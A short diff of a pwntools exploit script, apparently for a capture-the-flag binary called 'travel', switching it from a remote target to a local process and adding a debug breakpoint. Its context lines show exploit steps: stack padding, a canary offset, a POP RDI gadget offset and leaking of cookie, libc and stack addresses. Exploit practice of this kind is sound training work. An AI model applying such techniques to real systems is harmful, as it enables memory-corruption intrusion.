@@ -21,8 +21,8 @@ PADDING = 216
 PADDING_WITHOUT_SSP = PADDING - 16
 
 POP_RDI_DELTA =  0x2697b
-io = remote(host,port)
-#io = process("./travel", env={ "LD_PRELOAD" : "./libc.so.6" })
+# io = remote(host,port)
+io = process("./travel", env={ "LD_PRELOAD" : "./libc.so.6" })
 #io = gdb.debug(["./travel"], gdbscript='''set disable-randomization off''', env={ "LD_PRELOAD" : "./libc.so.6" })
 
 #Leak some stack address, cookie and libc address
@@ -34,6 +34,7 @@ leak_cookie, leak_libc, leak_stack = leak
 
 leak_cookie = int(leak_cookie, 16)
 leak_libc = int(leak_libc, 16)
+breakpoint()
 leak_stack = int(leak_stack, 16)
 
 print(f"[i] leaks -> cookie: {hex(leak_cookie)}, libc: {hex(leak_libc)}, stack: {hex(leak_stack)}")
